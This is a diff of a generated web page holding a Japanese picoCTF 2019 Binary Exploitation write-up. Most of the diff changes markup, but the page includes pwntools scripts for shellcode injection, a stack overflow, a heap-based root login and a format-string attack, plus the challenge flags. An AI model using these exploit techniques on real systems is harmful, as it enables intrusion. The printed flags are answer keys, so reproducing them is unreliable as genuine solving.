@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/picoctf_2019_binary/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="picoCTF 2019 Writeup (Binary Exploitation)" />
 <meta property="og:description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/picoctf_2019_binary/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/picoctf_2019_binary/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2019-10-12T07:45:00+09:00" />
 <meta property="article:modified_time" content="2019-10-13T10:30:00+09:00" />
 <meta itemprop="name" content="picoCTF 2019 Writeup (Binary Exploitation)">
-<meta itemprop="description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ">
-<meta itemprop="datePublished" content="2019-10-12T07:45:00&#43;09:00" />
-<meta itemprop="dateModified" content="2019-10-13T10:30:00&#43;09:00" />
-<meta itemprop="wordCount" content="2480">
-
-
-
+<meta itemprop="description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ"><meta itemprop="datePublished" content="2019-10-12T07:45:00+09:00" />
+<meta itemprop="dateModified" content="2019-10-13T10:30:00+09:00" />
+<meta itemprop="wordCount" content="2483">
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="picoCTF 2019 Writeup (Binary Exploitation)"/>
 <meta name="twitter:description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ"/>
@@ -211,6 +207,13 @@
     <li><a href="#binary-exploitation-seed-spring-350-points">[Binary Exploitation]: seed-sPRiNG (350 points)</a>
       <ul>
         <li><a href="#challenge-10">Challenge</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
         <li><a href="#solution-10">Solution</a></li>
       </ul>
     </li>
@@ -230,8 +233,8 @@
 <p><br /><br />
 最終結果は、こんな感じ。</p>
 <img src="https://captureamerica.github.io/writeups/img/pico2019_Score.png" alt="pico2019_Score.png">
-<p><br />
-イベント終了時点で、ユーザは4万人弱でした。</p>
+<br />
+イベント終了時点で、ユーザは4万人弱でした。
 <img src="https://captureamerica.github.io/writeups/img/pico2019_Users.png" alt="pico2019_Users.png">
 <img src="https://captureamerica.github.io/writeups/img/pico2019_Rank.png" alt="pico2019_Rank.png">
 <p>PwnとWeb系があんまりできてないけど、スコアも切りのいい20000に行ったし、Globalで目標の300位以内 (283位) にも入れたのでかなり満足です。</p>
@@ -252,12 +255,12 @@ Hint: You might be able to find some good shellcode online.</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>これは、picoCTF 2018のshellcodeと同じでした。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -266,14 +269,14 @@ Hint: You might be able to find some good shellcode online.</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
-
-<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Enter your shellcode:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Enter your shellcode:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Flag: <code>picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}</code></p>
 <p><br /><br />
@@ -293,7 +296,7 @@ Hint: Make sure your address is in Little Endian.</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>offsetを求めて、飛びたい関数に飛ぶだけ。</p>
 <pre>
@@ -318,12 +321,12 @@ Hint: Now that we&rsquo;re in 64-bit, what used to be 4 bytes, now may be 8 byte
 <li>vuln (ELF 64-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-2">Solution</h3>
 <p>picoCTFのサーバは、Ubuntu 18.04であるところがポイントです。16 byte alignmentしないと解けません。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -343,25 +346,25 @@ Hint: Now that we&rsquo;re in 64-bit, what used to be 4 bytes, now may be 8 byte
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;2019shell1.picoctf.com&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/newoverflow-1_3_e53f871ba121b62d35646880e2577f89&#39;</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
-
-<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00000000004005de</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">64</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>  <span class="c1"># for stack alignment</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400767</span><span class="p">)</span>  <span class="c1"># flag()</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;flag: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;2019shell1.picoctf.com&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/newoverflow-1_3_e53f871ba121b62d35646880e2577f89&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00000000004005de</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">64</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>  <span class="c1"># for stack alignment</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400767</span><span class="p">)</span>  <span class="c1"># flag()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;flag: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Flag: <code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_bfd48203}</code></p>
 <p><br /><br />
@@ -379,7 +382,7 @@ Hint: Arguments aren&rsquo;t stored on the stack anymore ;)</p>
 <li>vuln (ELF 64-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>たぶん問題が間違っている気がします。win_fn1()とかいくつか関数が追加されているものの、flag()が残っているので、NewOverFlow-1と全く同じで解けます。</p>
 <p>Flag: <code>picoCTF{r0p_1t_d0nT_st0p_1t_e51a1ea0}</code></p>
@@ -398,7 +401,7 @@ Hint: GDB can print the stack after you send arguments</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-4">Solution</h3>
 <p>これはpicoCTF 2018のbof2とほぼ同じです。</p>
 <pre>
@@ -423,7 +426,7 @@ Hint: Maybe there&rsquo;s a smart way to brute-force the canary?</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-5">Solution</h3>
 <p>これはpicoCTF 2018のbof3とほぼ同じです。</p>
 <p>去年のどこかのWriteupにあったコードを流用させてもらって、canary (33xO) をゲット。</p>
@@ -449,13 +452,13 @@ Hint: If only the program used calloc to zero out the memory..</p>
 <li>auth (ELF 64-bit)</li>
 <li>auth.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-6">Solution</h3>
 <p>GDBを使ってヒープがどうなるか見ながら解析しました。Ubuntu 18.04で解析したら、ちょっと動きが違ってました（うろ覚え）。</p>
 <p>あと、recvuntil()辺りが思ったように動かなくて Invalid option になっちゃったりしたので、よくわかんないけど Invalid になった際には再トライするようにして対処しました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -510,60 +513,60 @@ Hint: If only the program used calloc to zero out the memory..</p>
 </span><span class="lnt">53
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">re</span>
-
-<span class="c1"># s=process(&#39;./auth&#39;)</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;2019shell1.picoctf.com&#39;</span><span class="p">,</span> <span class="mi">21899</span><span class="p">)</span>
-    
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">)</span>
-<span class="k">print</span> <span class="s2">&#34;## login&#34;</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Please enter the length of your username</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;25&#34;</span><span class="p">)</span>
-<span class="k">print</span> <span class="s2">&#34;## 25&#34;</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Please enter your username</span>
-<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x52\x4f\x4f\x54\x5f\x41\x43\x43</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x45\x53\x53\x5f\x43\x4f\x44\x45</span><span class="s1">&#39;</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;logout&#34;</span><span class="p">)</span>
-<span class="k">print</span> <span class="s2">&#34;## logout&#34;</span>
-
-<span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
-<span class="k">print</span> <span class="n">msg</span>
-<span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;Invalid&#34;</span><span class="p">,</span><span class="n">msg</span><span class="p">):</span>
-    <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;logout&#34;</span><span class="p">)</span>
-    <span class="k">print</span> <span class="s2">&#34;## logout&#34;</span>
-    <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">)</span>
-    <span class="k">print</span> <span class="s2">&#34;## login&#34;</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">)</span>
-    <span class="k">print</span> <span class="s2">&#34;## login&#34;</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Please enter the length of your username</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;5&#34;</span><span class="p">)</span>
-<span class="k">print</span> <span class="s2">&#34;## 5&#34;</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Please enter your username</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;root&#34;</span><span class="p">)</span>
-<span class="k">print</span> <span class="s2">&#34;## root&#34;</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;print-flag&#34;</span><span class="p">)</span>
-<span class="k">print</span> <span class="s2">&#34;## print-flag&#34;</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
-<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;print-flag&#34;</span><span class="p">)</span>
-<span class="k">print</span> <span class="s2">&#34;## print-flag&#34;</span>
-
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># s=process(&#39;./auth&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;2019shell1.picoctf.com&#39;</span><span class="p">,</span> <span class="mi">21899</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;## login&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Please enter the length of your username</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;25&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;## 25&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Please enter your username</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x52\x4f\x4f\x54\x5f\x41\x43\x43</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x45\x53\x53\x5f\x43\x4f\x44\x45</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;logout&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;## logout&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">msg</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;Invalid&#34;</span><span class="p">,</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;logout&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;## logout&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;## login&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;## login&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Please enter the length of your username</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;5&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;## 5&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># Please enter your username</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;root&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;## root&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;print-flag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;## print-flag&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span> <span class="c1"># Enter you command:</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;print-flag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;## print-flag&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Flag: <code>picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_ac0e0e6a}</code></p>
 <p><br /><br />
@@ -581,12 +584,12 @@ Hint: <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/For
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-7">Solution</h3>
 <p>書式文字列攻撃の問題です。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -610,32 +613,32 @@ Hint: <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/For
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding:utf-8 -*-</span>
-
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
-
